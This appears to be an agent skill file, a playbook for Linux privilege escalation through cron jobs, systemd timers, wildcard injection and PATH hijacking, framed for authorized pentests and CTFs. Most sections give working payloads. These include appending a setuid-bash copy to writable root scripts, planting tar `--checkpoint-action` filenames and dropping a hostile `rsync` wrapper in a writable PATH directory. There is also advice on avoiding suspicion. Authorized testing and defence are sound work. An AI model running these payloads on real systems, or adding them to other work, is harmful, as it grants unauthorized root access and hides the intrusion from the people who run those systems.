---
name: privesc-linux-vectors-cron-and-path-hijacking
description: Use when authorized Linux privilege escalation turns to
  scheduled execution: cron jobs, systemd timers, and PATH hijacking. Covers
  enumerating every cron location and timer unit, spotting writable scripts
  executed as root, wildcard injection in tar and rsync invocations, PATH
  hijacking when scheduled jobs call bare command names, relative path
  abuse in SUID programs and scripts, and systemd timer unit weaknesses.
  Includes timing your payload to the schedule and staying quiet. For
  authorized pentests, labs, and CTFs only.
version: 1.0.0
domain: privesc
lifecycle: stable
last_verified: 2026-10-23
requires: [privesc-linux-vectors]
extends: []
parent: privesc-linux-vectors
relates: [privesc-linux, privesc-linux-vectors-suid-binaries]
tools:
  - name: linpeas
    version: 2.x
  - name: systemd
    version: 255
  - name: Python
    version: 3.12
  - name: cron
    version: 3.0pl1
---
Scheduled tasks run code as another user, usually root, on a timer. On an authorized engagement that makes every cron job and systemd timer a potential privilege escalation: if you can influence what the scheduled job executes, you execute as root when the schedule fires. This sub-skill covers complete cron and timer enumeration, writable script takeover, wildcard injection, and PATH hijacking in scheduled and SUID contexts. Scope is authorized penetration tests, labs, and CTFs only.

## Quick Workflow

1. Enumerate every schedule source: `/etc/crontab`, `/etc/cron.d/`, `/etc/cron.hourly|daily|weekly|monthly`, user crontabs, `/var/spool/cron/`, and `systemctl list-timers --all`.
2. For each job, read the exact command line and identify the user it runs as (root unless stated otherwise).
3. Inspect every script and binary the job touches: ownership, writability, and the writability of its parent directories.
4. Classify the weakness: writable script, wildcard in the command line, bare command name with a writable PATH entry, or writable timer unit.
5. Plant a minimal payload, verify the schedule timing, and wait for execution; confirm with a marker file before deploying the real payload.
6. Clean up the payload after success and document the exact job, timing, and commands for the report.

## 1. Complete cron enumeration

Cron configuration is scattered across several locations; check all of them.

```bash
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*
ls -la /etc/cron.hourly/ /etc/cron.daily/
crontab -l 2>/dev/null
ls -la /var/spool/cron/crontabs/ 2>/dev/null
```

Example output shape:

```
*/5 * * * * root /opt/scripts/backup.sh
17 * * * * root cd /var/backups && tar czf /backup/site.tgz *
```

The first line runs `/opt/scripts/backup.sh` as root every five minutes: check whether that script or its directory is writable. The second line has a wildcard passed to tar as root, which is the wildcard injection pattern from section 3. Also list systemd timers, which are the modern cron replacement:

```bash
systemctl list-timers --all
systemctl cat backup.timer backup.service 2>/dev/null
```

## 2. Writable script takeover

The simplest cron escalation: the scheduled script, or anything it sources, is writable by you.

```bash
ls -la /opt/scripts/backup.sh
ls -ld /opt/scripts
```

Example output shape: `-rwxrwxr-x 1 root devs 210 Oct 20 09:00 /opt/scripts/backup.sh` where your user is in `devs` means group-writable, which is enough. Append or replace with a payload:

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
```

Then wait for the schedule and run `/tmp/rootbash -p`. Prefer appending over replacing so the original job still runs (less breakage, less suspicion). Always check scripts the job sources or calls: a root-owned script that sources a writable config file is equally exploitable.

## 3. Wildcard injection

When a root cron job passes an unquoted `*` to tar, rsync, or chown, filenames in that directory become command options.

```bash
ls -la /var/backups
```

If the cron line is `tar czf /backup/site.tgz *` running as root in `/var/backups`, and you can write to `/var/backups`, create the injection files:

```bash
cd /var/backups
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > pwn.sh
chmod +x pwn.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh pwn.sh'
```

When tar expands `*`, it interprets those filenames as options and executes `pwn.sh` as root. The same class applies to `rsync` (via `--` options in filenames) and `chown`/`chmod` with `--reference` tricks. Verify writability of the working directory first; without it the technique is dead.

## 4. PATH hijacking in scheduled jobs

Cron jobs often run with a minimal or default PATH and call commands by bare name. If you can write to a directory that appears earlier in the job's PATH, your binary wins.

```bash
grep -r "PATH" /etc/crontab /etc/cron.d/ 2>/dev/null
cat /opt/scripts/backup.sh
```

Example: the script calls `rsync` by bare name, and the cron environment sets `PATH=/usr/local/bin:/usr/bin:/bin` while `/usr/local/bin` is writable by you. Drop a hostile `rsync` there:

```bash
cat > /usr/local/bin/rsync <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
exec /usr/bin/rsync "$@"
EOF
chmod +x /usr/local/bin/rsync
```

The wrapper does the malicious action and then delegates to the real binary so the job completes normally. The same technique applies to SUID binaries that call other programs by relative name: poison the PATH before executing the SUID binary.

## 5. Relative path abuse in scripts and SUID binaries

Scripts executed as root that invoke commands without absolute paths, or that `cd` into attacker-controlled directories and execute local files, are hijackable.

```bash
grep -nE "^[^#]*(^|[ ;|&])(python|perl|ruby|tar|rsync|scp|git) " /opt/scripts/backup.sh
```

Look for lines like `python helper.py` (relative script name: place your own `helper.py` earlier in the resolution order) or sourcing like `. ./config.sh` (writable local config). For SUID binaries, `strings` revealing `system("service nginx restart")` means PATH hijacking applies at execution time: set your PATH with a hostile `service` first, then run the SUID binary.

## 6. Systemd timer weaknesses

Timers execute a paired `.service` unit; both files are attack surface.

```bash
systemctl list-timers --all
systemctl cat nightly-backup.timer nightly-backup.service
ls -la /etc/systemd/system/nightly-backup.service
```

Example output shape: a service running `ExecStart=/opt/nightly.sh` as root on a daily timer. Check writability of the unit file itself (a writable unit file lets you change `ExecStart` directly, then `systemctl daemon-reload`), writability of the executed script, and whether the service runs with an exploitable configuration. Timer-based jobs log to the journal, so verify execution with `journalctl -u nightly-backup.service`.

## Edge cases

- Cron minimal environment: jobs run with a sparse PATH and no tty; payloads must use absolute paths and avoid interactive behavior.
- The schedule may be hourly or daily; use a marker file (`touch /tmp/pwned`) on first trigger to confirm timing before deploying the full payload.
- Logrotate-style cron jobs in `/etc/cron.daily` run at fixed early-morning times on many distros; plan the engagement timeline around the wait.
- Wildcard injection requires the glob to actually expand your filenames; if the directory also contains subdirectories, tar recurses and the option files still work, but test carefully.
- systemd timers with `Persistent=true` fire immediately at boot if they missed a run, which can trigger your payload during a reboot you did not expect.
- Some cron implementations ignore crontabs with wrong permissions or ownership; if your planted job never fires, verify the file modes match what the daemon requires.

## Escalation

- If no cron job is directly writable, look one level deeper: config files the script sources, log files it appends to with shell redirection tricks, and binaries it calls by bare name.
- When cron as a class is clean, check for other scheduled execution: `at` jobs (`atq`), anacron, and custom scheduler daemons visible in `ps aux`.
- If PATH hijacking fails because the job sets a safe PATH, check whether the job itself is defined in a writable `/etc/cron.d` file where you can edit the PATH line.
- Combine vectors: a sudo entry that lets you restart a service plus a writable service script is cron-like execution under your control.

## Detection and defender view

Defenders should monitor cron directories and timer units with file integrity monitoring, alert on new files in cron paths, centralize cron logs, and ensure scheduled scripts and their parent directories are root-owned and non-writable. Wildcard injection is prevented by quoting or by using `--` end-of-options markers in scripts. From the authorized tester side, cron payloads are time-delayed and create new files, both of which are visible to FIM and process monitoring; keep payloads minimal, restore original files afterward, and record exact trigger times for the report timeline.

## Key references

- MITRE ATT&CK T1053.003 (Cron), T1053 (Scheduled Task/Job)
- cron manual: https://man7.org/linux/man-pages/man5/crontab.5.html
- systemd.timer docs: https://www.freedesktop.org/software/systemd/man/systemd.timer.html
- Wildcard injection research: https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
- HackTricks cron section: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-tasks
- GTFOBins (for hijacked binary primitives): https://gtfobins.github.io
